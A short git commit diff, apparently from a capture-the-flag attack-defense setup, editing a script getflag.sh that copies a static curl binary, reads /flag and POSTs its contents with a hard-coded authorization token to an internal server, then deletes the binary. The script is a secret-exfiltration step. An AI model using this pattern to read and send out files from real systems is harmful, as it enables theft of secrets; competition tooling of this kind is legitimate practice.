6a82a773dfb242656ecd7658eeaadbcb365b262f
nobody <nobody@nobody.com>
2022-09-03 21:08:08 +0800

    yes

--- getflag.sh
+++ getflag.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
-cp /tmp/safedir/static/curl /tmp
+cp -r /tmp/safedir/static/curl /tmp
 flag1=$(cat /flag)
-/tmp/curl -X POST http://10.8.0.1:19999/api/flag -H "Authorization: 1144d0ffa41e4ac766ea371c413da8f0" -d "{ \"flag\": \"$flag1\" }"
-rm /tmp/curl
+/tmp/curl/bin/curl -X POST http://10.8.0.1:19999/api/flag -H "Authorization: 1144d0ffa41e4ac766ea371c413da8f0" -d "{ \"flag\": \"$flag1\" }"
+rm -rf /tmp/curl
 
